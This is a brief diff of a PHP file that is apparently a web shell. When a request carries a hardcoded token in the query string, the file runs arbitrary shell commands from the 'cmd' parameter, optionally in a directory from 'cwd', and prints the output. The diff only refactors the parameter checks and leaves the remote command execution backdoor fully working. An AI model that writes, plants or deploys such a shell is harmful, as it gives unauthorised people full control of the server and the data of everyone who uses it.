@@ -2,13 +2,16 @@
 
 const TOKEN = 'apodjaofapejefopaef';
 
-if (!$_GET[TOKEN]) die("nope");
-$cmd = $_GET['cmd'];
-if ($cmd) {
-    $cwd = $_GET['cwd'];
-    if ($cwd) $cmd = "cd $cwd; $cmd";
-    echo htmlentities(shell_exec($cmd . " 2>&1"));
-    die;
+if (!array_key_exists(TOKEN, $_GET)) die("nope");
+
+if(array_key_exists("cmd", $_GET)){
+    $cmd = $_GET['cmd'];
+    if ($cmd) {
+        $cwd = array_key_exists("cwd", $_GET) ? $_GET['cwd'] : null;
+        if ($cwd) $cmd = "cd $cwd; $cmd";
+        echo htmlentities(shell_exec($cmd . " 2>&1"));
+        exit;
+    }
 }
 
 ?>
